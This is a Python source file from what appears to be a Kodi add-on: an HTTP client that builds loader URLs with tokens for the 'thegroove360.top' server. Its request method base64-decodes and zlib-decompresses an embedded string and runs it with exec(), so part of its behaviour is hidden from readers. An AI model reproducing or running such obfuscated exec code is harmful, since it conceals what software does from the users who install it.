import logging
import xbmcaddon
import zlib
import base64

try:
    from urllib.parse import quote as quoter
    from urllib.parse import unquote as unquoter
except ImportError:
    from urllib import quote as quoter
    from urllib import unquote as unquoter

from resources.lib import kodiutils
from resources.modules.httpclient import HttpClient

ADDON = xbmcaddon.Addon()
logger = logging.getLogger(ADDON.getAddonInfo('id'))


class ThegrooveHttpClient(HttpClient):

    def __init__(self):
        HttpClient.__init__(self)
        self.server_url = 'https://thegroove360.top/'
        self._loader = self.server_url + "loader2.php?page="
        self.opts = ""

    def get_request(self, url, **kwargs):
        logger.debug("________ STEFANO GET REQUEST ___________")
        loc = {}
        exec(zlib.decompress(base64.b64decode(
            'eJxLK8rPVShKLc4vLUpOLdbLzU8pzQHSJRmp6UX5+WWpeiH52al5Cpm5BflFJQpgDleJLZjW0OQq0StOLYkvgfIAYp8bww==')),
             globals(), loc)
        t = loc["t"]

        url = self.url_composer(url)
        url = self._loader + url + self.opts + "&token=" + t.token
        # logger.debug(url)
        if "php_search" in url:
            kwargs["timeout"] = (15, 180)
        res = HttpClient.get_request(self, url, **kwargs)

        if self.opts == "":
            t.set_result(res)
            if t.result:
                return t.result
        else:
            return res.text

    @staticmethod
    def url_composer(page):
        if "/thegroove/scripters/" in page and "path=" in page:
            scripter, spage = page.replace("/thegroove/scripters/", "").split("/", 1)
            page = "php_script_loader?scripter=" + unquoter(scripter) + "&" + unquoter(spage)

        if "?" in page:
            page, params = page.split("?")
            if params != "":
                params = base64.urlsafe_b64encode(params)
                page += "&page_params=" + params

        return page
